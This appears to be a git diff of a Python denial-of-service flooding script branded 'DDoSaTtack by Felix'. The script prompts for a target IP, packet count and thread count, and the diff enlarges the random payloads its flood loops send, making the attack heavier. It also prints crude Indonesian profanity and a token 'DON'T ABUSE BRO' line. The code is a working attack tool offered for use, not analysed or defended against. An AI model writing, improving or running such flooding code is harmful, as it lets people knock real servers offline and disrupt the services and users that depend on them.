@@ -12,6 +12,7 @@ print("""\033[31m
 ██║░░░░░███████╗███████╗██║██╔╝╚██╗
 ╚═╝░░░░░╚══════╝╚══════╝╚═╝╚═╝░░╚═╝""")
 print("DDoSaTtack by Felix ")
+print("DON'T ABUSE BRO ")
 print("Kalau Mau Pakek Coli Dulu")
 print("By Felix Xyz ")
 ip = str(input(" DdosAttackByFelix | Ip:"))
@@ -20,7 +21,7 @@ choice = str(input(" DdosAttackByFelix | Gas Gak Ni?(y/n):"))
 times = int(input(" DdosAttackByFelix | Packets:"))
 threads = int(input(" DdosAttackByFelix | Threads:"))
 def run():
-	data = random._urandom(9999)
+	data = random._urandom(99999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -33,7 +34,7 @@ def run():
 			print("[!] | Server down kontol!!! |")
 
 def run2():
-	data = random._urandom(99)
+	data = random._urandom(999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
